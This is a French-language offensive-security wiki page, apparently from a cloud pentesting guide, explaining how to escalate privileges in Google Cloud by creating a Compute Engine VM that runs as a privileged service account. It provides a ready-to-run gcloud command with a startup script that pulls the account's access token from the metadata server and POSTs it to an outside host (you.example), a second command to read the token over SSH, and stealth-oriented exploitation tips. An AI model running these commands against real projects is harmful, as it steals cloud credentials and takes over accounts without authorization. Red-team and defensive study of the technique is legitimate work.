---
title: "Instance Compute : créer une VM en tant que compte de service privilégié"
description: "Créer une instance Compute Engine avec compute.instances.create plus actAs, en attachant un compte de service privilégié et un scope d'accès complet, puis en lisant son jeton depuis les métadonnées."
keywords:
  - compute.instances.create
  - actAs
  - compte de service
  - scope d'accès
  - jeton de métadonnées
  - Compute Engine
---

# Instance Compute

Avec `compute.instances.create` et `iam.serviceAccounts.actAs` sur un compte de service privilégié, vous lancez une VM qui s'exécute en tant que ce compte. Démarrez-la avec le scope `cloud-platform` et lisez le jeton du compte depuis le serveur de métadonnées, ou passez un script de démarrage qui exfiltre le jeton pour ne jamais avoir à vous connecter.

## Lancer avec un compte privilégié

```bash
gcloud compute instances create pwn --zone <zone> \
  --service-account=<privileged-sa>@<project>.iam.gserviceaccount.com \
  --scopes=cloud-platform \
  --metadata=startup-script='#! /bin/bash
curl -s -H "Metadata-Flavor: Google" \
 "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
 | curl -X POST -d @- https://you.example'
```

Si vous pouvez atteindre la machine, sautez le script et lisez le jeton après vous être connecté en SSH :

```bash
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
```

## Notes d'exploitation

- Le **scope** d'accès limite ce que le jeton peut faire : une VM créée sans `cloud-platform` peut détenir le rôle mais être limitée par le scope, définissez donc toujours `--scopes=cloud-platform`.
- Le compte cible doit être utilisable dans le projet et vous devez détenir `actAs` sur lui ; `gcloud iam service-accounts list` plus sa politique IAM confirment les candidats.
- Ceci est plus bruyant que l'usurpation d'identité (cela crée une VM facturable), préférez donc [getAccessToken](../../service-account-impersonation/get-access-token.md) lorsque vous le détenez ; utilisez cette méthode lorsque `actAs` plus create est le seul levier.

## Outils

- **gcloud** (`compute instances create`) : le lancement.
- **GCP-IAM-Privilege-Escalation** (Rhino) : automatise la variante créer-et-voler.

## Références

- [Rhino Security Labs : escalade de privilèges GCP (partie 2)](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-2/)
- [Escalade de privilèges GCP IAM (dépôt Rhino)](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation)
- [Google : créer des VM avec un compte de service](https://cloud.google.com/compute/docs/access/create-enable-service-accounts-for-instances)
